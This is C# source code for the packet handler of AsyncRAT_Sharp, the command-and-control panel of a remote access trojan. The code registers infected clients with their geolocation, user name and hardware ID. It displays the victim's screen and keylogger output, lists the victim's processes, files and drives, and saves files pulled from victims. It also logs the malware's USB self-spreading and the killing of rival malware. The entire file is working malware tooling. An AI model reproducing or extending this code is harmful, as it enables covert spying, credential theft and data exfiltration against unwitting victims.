using AsyncRAT_Sharp.Sockets;
using System.Windows.Forms;
using AsyncRAT_Sharp.MessagePack;
using System;
using System.Diagnostics;
using System.Drawing;
using AsyncRAT_Sharp.Forms;
using System.IO;
using cGeoIp;

namespace AsyncRAT_Sharp.Handle_Packet
{
    class HandlePacket
    {
        private static cGeoMain cNewGeoUse = new cGeoMain();
        public static void Read(object Obj)
        {
            try
            {
                object[] array = Obj as object[];
                byte[] Data = (byte[])array[0];
                Clients Client = (Clients)array[1];
                MsgPack unpack_msgpack = new MsgPack();
                unpack_msgpack.DecodeFromBytes(Data);
                switch (unpack_msgpack.ForcePathObject("Packet").AsString)
                {
                    case "ClientInfo":
                        if (Program.form1.listView1.InvokeRequired)
                        {
                            Program.form1.listView1.BeginInvoke((MethodInvoker)(() =>
                            {
                                Client.LV = new ListViewItem();
                                Client.LV.Tag = Client;
                                Client.LV.Text = string.Format("{0}:{1}", Client.ClientSocket.RemoteEndPoint.ToString().Split(':')[0], Client.ClientSocket.LocalEndPoint.ToString().Split(':')[1]);
                                string[] ipinf = cNewGeoUse.GetIpInf(Client.ClientSocket.RemoteEndPoint.ToString().Split(':')[0]).Split(':');
                                Client.LV.SubItems.Add(ipinf[1]);
                                Client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("HWID").AsString);
                                Client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("User").AsString);
                                Client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("OS").AsString);
                                Client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Version").AsString);
                                Client.LV.ToolTipText = unpack_msgpack.ForcePathObject("Path").AsString;
                                Client.ID = unpack_msgpack.ForcePathObject("HWID").AsString;
                                Program.form1.listView1.Items.Insert(0, Client.LV);
                                lock (Settings.Online)
                                {
                                    Settings.Online.Add(Client);
                                }
                            }));
                            HandleLogs.Addmsg($"Client {Client.ClientSocket.RemoteEndPoint.ToString().Split(':')[0]} connected successfully", Color.Green);
                        }
                        break;

                    case "Ping":
                        {
                            Debug.WriteLine(unpack_msgpack.ForcePathObject("Message").AsString);
                        }
                        break;

                    case "Logs":
                        {
                            HandleLogs.Addmsg(unpack_msgpack.ForcePathObject("Message").AsString, Color.Black);
                        }
                        break;


                    case "BotKiller":
                        {
                            HandleLogs.Addmsg($"Client {Client.ClientSocket.RemoteEndPoint.ToString().Split(':')[0]} found {unpack_msgpack.ForcePathObject("Count").AsString} malwares and killed them successfully", Color.Orange);
                        }
                        break;


                    case "usbSpread":
                        {
                            HandleLogs.Addmsg($"Client {Client.ClientSocket.RemoteEndPoint.ToString().Split(':')[0]} found {unpack_msgpack.ForcePathObject("Count").AsString} USB drivers and spreaded them successfully", Color.Purple);
                        }
                        break;

                    case "Received":
                        {
                            if (Program.form1.listView1.InvokeRequired)
                            {
                                Program.form1.listView1.BeginInvoke((MethodInvoker)(() =>
                                {
                                    Client.LV.ForeColor = Color.Empty;
                                }));
                            }
                        }
                        break;

                    case "remoteDesktop":
                        {
                            if (Program.form1.InvokeRequired)
                            {
                                Program.form1.BeginInvoke((MethodInvoker)(() =>
                                {
                                    RemoteDesktop RD = (RemoteDesktop)Application.OpenForms["RemoteDesktop:" + Client.ID];
                                    try
                                    {
                                        if (RD != null && RD.Active == true)
                                        {
                                            byte[] RdpStream = unpack_msgpack.ForcePathObject("Stream").GetAsBytes();
                                            Bitmap decoded = RD.decoder.DecodeData(new MemoryStream(RdpStream));

                                            if (RD.RenderSW.ElapsedMilliseconds >= (1000 / 20))
                                            {
                                                RD.pictureBox1.Image = (Bitmap)decoded;
                                                RD.RenderSW = Stopwatch.StartNew();
                                            }
                                            RD.FPS++;
                                            if (RD.sw.ElapsedMilliseconds >= 1000)
                                            {
                                                RD.Text = "RemoteDesktop:" + Client.ID + "    FPS:" + RD.FPS + "    Screen:" + decoded.Width + " x " + decoded.Height + "    Size:" + Methods.BytesToString(RdpStream.Length);
                                                RD.FPS = 0;
                                                RD.sw = Stopwatch.StartNew();
                                            }
                                        }
                                        else
                                        {
                                            MsgPack msgpack = new MsgPack();
                                            msgpack.ForcePathObject("Packet").AsString = "remoteDesktop";
                                            msgpack.ForcePathObject("Option").AsString = "false";
                                            Client.BeginSend(msgpack.Encode2Bytes());
                                        }
                                    }
                                    catch (Exception ex) { Debug.WriteLine(ex.Message); }
                                }));
                            }
                        }
                        break;

                    case "processManager":
                        {
                            if (Program.form1.InvokeRequired)
                            {
                                Program.form1.BeginInvoke((MethodInvoker)(() =>
                                {
                                    ProcessManager PM = (ProcessManager)Application.OpenForms["processManager:" + Client.ID];
                                    if (PM != null)
                                    {
                                        PM.listView1.Items.Clear();
                                        string AllProcess = unpack_msgpack.ForcePathObject("Message").AsString;
                                        string data = AllProcess.ToString();
                                        string[] _NextProc = data.Split(new[] { "-=>" }, StringSplitOptions.None);
                                        for (int i = 0; i < _NextProc.Length; i++)
                                        {
                                            if (_NextProc[i].Length > 0)
                                            {
                                                ListViewItem lv = new ListViewItem();
                                                lv.Text = Path.GetFileName(_NextProc[i]);
                                                lv.SubItems.Add(_NextProc[i + 1]);
                                                lv.ToolTipText = _NextProc[i];
                                                Image im = Image.FromStream(new MemoryStream(Convert.FromBase64String(_NextProc[i + 2])));
                                                PM.imageList1.Images.Add(_NextProc[i + 1], im);
                                                lv.ImageKey = _NextProc[i + 1];
                                                PM.listView1.Items.Add(lv);
                                            }
                                            i += 2;
                                        }
                                    }
                                }));
                            }
                        }
                        break;


                    case "socketDownload":
                        {
                            switch (unpack_msgpack.ForcePathObject("Command").AsString)
                            {
                                case "pre":
                                    {
                                        if (Program.form1.InvokeRequired)
                                        {
                                            Program.form1.BeginInvoke((MethodInvoker)(() =>
                                            {

                                                string dwid = unpack_msgpack.ForcePathObject("DWID").AsString;
                                                string file = unpack_msgpack.ForcePathObject("File").AsString;
                                                string size = unpack_msgpack.ForcePathObject("Size").AsString;
                                                DownloadFile SD = (DownloadFile)Application.OpenForms["socketDownload:" + dwid];
                                                if (SD != null)
                                                {
                                                    SD.C = Client;
                                                    SD.labelfile.Text = Path.GetFileName(file);
                                                    SD.dSize = Convert.ToInt64(size);
                                                    SD.timer1.Start();
                                                }
                                            }));
                                        }
                                    }
                                    break;

                                case "save":
                                    {
                                        if (Program.form1.InvokeRequired)
                                        {
                                            Program.form1.BeginInvoke((MethodInvoker)(() =>
                                            {
                                                string dwid = unpack_msgpack.ForcePathObject("DWID").AsString;
                                                DownloadFile SD = (DownloadFile)Application.OpenForms["socketDownload:" + dwid];
                                                if (SD != null)
                                                {
                                                    if (!Directory.Exists(Path.Combine(Application.StartupPath, "ClientsFolder\\" + SD.Text.Replace("socketDownload:", ""))))
                                                        Directory.CreateDirectory(Path.Combine(Application.StartupPath, "ClientsFolder\\" + SD.Text.Replace("socketDownload:", "")));

                                                    unpack_msgpack.ForcePathObject("File").SaveBytesToFile(Path.Combine(Application.StartupPath, "ClientsFolder\\" + SD.Text.Replace("socketDownload:", "") + "\\" + unpack_msgpack.ForcePathObject("Name").AsString));
                                                }
                                            }));
                                        }
                                    }
                                    break;
                            }
                            break;
                        }

                    case "keyLogger":
                        {
                            if (Program.form1.InvokeRequired)
                            {
                                Program.form1.BeginInvoke((MethodInvoker)(() =>
                                {
                                    Keylogger KL = (Keylogger)Application.OpenForms["keyLogger:" + Client.ID];
                                    if (KL != null)
                                    {
                                        KL.richTextBox1.AppendText(unpack_msgpack.ForcePathObject("Log").GetAsString());
                                    }
                                    else
                                    {
                                        MsgPack msgpack = new MsgPack();
                                        msgpack.ForcePathObject("Packet").AsString = "keyLogger";
                                        msgpack.ForcePathObject("Log").AsString = "false";
                                        Client.BeginSend(msgpack.Encode2Bytes());
                                    }
                                }));
                            }
                            break;
                        }

                    case "fileManager":
                        {
                            switch (unpack_msgpack.ForcePathObject("Command").AsString)
                            {
                                case "getDrivers":
                                    {
                                        if (Program.form1.InvokeRequired)
                                        {
                                            Program.form1.BeginInvoke((MethodInvoker)(() =>
                                            {
                                                FileManager FM = (FileManager)Application.OpenForms["fileManager:" + Client.ID];
                                                if (FM != null)
                                                {
                                                    FM.listView1.Items.Clear();
                                                    string[] driver = unpack_msgpack.ForcePathObject("Driver").AsString.Split(new[] { "-=>" }, StringSplitOptions.None);
                                                    for (int i = 0; i < driver.Length; i++)
                                                    {
                                                        if (driver[i].Length > 0)
                                                        {
                                                            ListViewItem lv = new ListViewItem();
                                                            lv.Text = driver[i];
                                                            lv.ToolTipText = driver[i];
                                                            if (driver[i + 1] == "Fixed") lv.ImageIndex = 1;
                                                            else if (driver[i + 1] == "Removable") lv.ImageIndex = 2;
                                                            else lv.ImageIndex = 1;
                                                            FM.listView1.Items.Add(lv);
                                                        }
                                                        i += 1;
                                                    }
                                                }
                                            }));
                                        }
                                    }
                                    break;

                                case "getPath":
                                    {
                                        if (Program.form1.InvokeRequired)
                                        {
                                            Program.form1.BeginInvoke((MethodInvoker)(() =>
                                            {
                                                FileManager FM = (FileManager)Application.OpenForms["fileManager:" + Client.ID];
                                                if (FM != null)
                                                {
                                                    FM.listView1.Items.Clear();
                                                    FM.listView1.Groups.Clear();
                                                    string[] _folder = unpack_msgpack.ForcePathObject("Folder").AsString.Split(new[] { "-=>" }, StringSplitOptions.None);
                                                    ListViewGroup groupFolder = new ListViewGroup("Folders");
                                                    FM.listView1.Groups.Add(groupFolder);
                                                    int numFolders = 0;
                                                    for (int i = 0; i < _folder.Length; i++)
                                                    {
                                                        if (_folder[i].Length > 0)
                                                        {
                                                            ListViewItem lv = new ListViewItem();
                                                            lv.Text = _folder[i];
                                                            lv.ToolTipText = _folder[i + 1];
                                                            lv.Group = groupFolder;
                                                            lv.ImageIndex = 0;
                                                            FM.listView1.Items.Add(lv);
                                                            numFolders += 1;
                                                        }
                                                        i += 1;

                                                    }

                                                    string[] _file = unpack_msgpack.ForcePathObject("File").AsString.Split(new[] { "-=>" }, StringSplitOptions.None);
                                                    ListViewGroup groupFile = new ListViewGroup("Files");
                                                    FM.listView1.Groups.Add(groupFile);
                                                    int numFiles = 0;
                                                    for (int i = 0; i < _file.Length; i++)
                                                    {
                                                        if (_file[i].Length > 0)
                                                        {
                                                            ListViewItem lv = new ListViewItem();
                                                            lv.Text = Path.GetFileName(_file[i]);
                                                            lv.ToolTipText = _file[i + 1];
                                                            Image im = Image.FromStream(new MemoryStream(Convert.FromBase64String(_file[i + 2])));
                                                            FM.imageList1.Images.Add(_file[i + 1], im);
                                                            lv.ImageKey = _file[i + 1];
                                                            lv.Group = groupFile;
                                                            lv.SubItems.Add(Methods.BytesToString(Convert.ToInt64(_file[i + 3])));
                                                            FM.listView1.Items.Add(lv);
                                                            numFiles += 1;
                                                        }
                                                        i += 3;
                                                    }
                                                    FM.toolStripStatusLabel2.Text = $"       Folder[{numFolders.ToString()}]   Files[{numFiles.ToString()}]";
                                                }
                                            }));
                                        }
                                    }
                                    break;
                            }
                            break;
                        }
                }
            }

            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message);
            }
        }
    }
}